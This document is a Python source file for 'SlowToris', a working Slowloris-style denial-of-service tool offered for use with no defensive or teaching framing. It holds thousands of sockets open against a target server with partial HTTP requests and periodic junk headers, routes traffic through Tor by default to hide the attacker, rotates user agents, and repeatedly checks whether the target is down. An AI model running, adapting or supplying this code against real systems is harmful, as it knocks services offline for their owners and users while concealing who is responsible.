#!/usr/bin/python
#Generally best to use no more than a couple thousand sockets

import socket, sys, time, random, ssl, threading, urllib
import resource
import atexit
resource.setrlimit(resource.RLIMIT_NOFILE, (10240, 10240))

tor = True

socket_list = []
def cleanup():
	print("Cleaning up...")
	for socket in socket_list:
		socket.close()
	for socket in socket_list:
		del socket
atexit.register(cleanup)
socket.setdefaulttimeout(5)

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

slLock = threading.Lock()
class socketCreator (threading.Thread):
	def __init__(self, host, port, num_sockets, isHTTPS, socket_list):
		threading.Thread.__init__(self)
		self.host = host
		self.port = port
		self.num_sockets = num_sockets
		self.isHTTPS = isHTTPS
		self.socket_list = socket_list
	def run(self):
		s = None
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			if self.isHTTPS:
				s = ssl.wrap_socket(s)
			s.settimeout(5)
			s.connect((self.host, self.port))
			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
			s.send(("Host: "+self.host+"\r\nUser-Agent: {}\r\n".format(random.choice(user_agents))).encode("utf-8"))
			s.send(("{}\r\n".format("Accept-language: en-US,en,q=0.5")).encode("utf-8"))
		except Exception as err:
			# print(err)
			return
		slLock.acquire()
		try:
			socket_list.append(s)
		except:
			slLock.release()
			return
		slLock.release()
		
def checkTarget(host, port):
	try:
		check = urllib.urlopen("http://"+host+":"+str(port)).getcode()
		if (check is 200):
			print("T A R G E T  IS  U P")
		else:
			print("T A R G E T  IS  D O W N")
	except:
		print("T A R G E T  IS  D O W N")

def connectTor():
    print("Connecting to Tor")
    import socks
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 , "127.0.0.1", 9150, True)
    socket.socket = socks.socksocket
    print("Connected to Tor")

def main(host, port, num_sockets, isHTTPS):
	print("CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::")
	print("CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::")
	print("CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::")
	print("CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::")
	print("CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:")
	print("ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc")
	print("ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo")
	print("oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC")
	print("oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC")
	print("oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO")
	print("CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O")
	print("CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO")
	print("OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO")
	print("OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO")
	print("COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO")
	print("CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC")
	print("coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC")
	print(":ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC")
	print(".:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC")
	print("....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo")
	print(".......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc")
	print("...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co")
	print(".............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo")
	print(" ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC")
	print("   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco")
	print("  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc")
	print("       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco")
	print("Welcome to SlowToris - the low bandwidth, Tor routed, yet poisonous HTTP client")
	if tor:
		connectTor()
	print("Connecting to " + host + ":" + str(port) + "")
	checkTarget(host, port)
	sockThreads = []
	for i in range(0, num_sockets):
		sockThread = socketCreator(host, port, num_sockets, isHTTPS, socket_list)
		sockThreads.append(sockThread)
		sockThread.start()
		time.sleep(0.001)
		sys.stdout.write("\rThread started: %i" % (i + 1))
		sys.stdout.flush()
	print("")
	for thread in sockThreads:
		thread.join()
	print(str(len(socket_list)) + " sockets connected to " + host)

	checkCount = 0

	while(True):
		if checkCount % 5 is 0:
			checkTarget(host, port)
		checkCount += 1
		sockThreads = []
		print("Keeping " + str(len(socket_list)) + " sockets alive")
		for sock in socket_list:
			try:
				sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			except socket.error:
				try:
					sock.close()
				except:
					pass
				socket_list.remove(sock)
		for i in range(len(socket_list), num_sockets):
			sockThread = socketCreator(host, port, num_sockets, isHTTPS, socket_list)
			sockThreads.append(sockThread)
			sockThread.start()
			time.sleep(0.001)
		for thread in sockThreads:
			thread.join()
		print("Payloads sent, sleeping...")
		time.sleep(15)
if __name__ == "__main__":
	args = sys.argv[1:]
	host = None
	port = 80
	num_sockets = 1000
	isHTTPS = False
	try:
		host = str(args[0])
		port = int(args[1])
		num_sockets = int(args[2])
		isHTTPS = str(args[3]).lower() == "y"
	except:
		print("Incorrect args format")
		print("Correct args format: python3 slowtoris.py IPv4(str) port(int) num_sockets(int) isHTTPS(Y/N)")
		exit(1)
	if num_sockets > 10240:
		num_sockets = 10240
	if isHTTPS:
		port = 443
	
	main(host, port, num_sockets, isHTTPS)




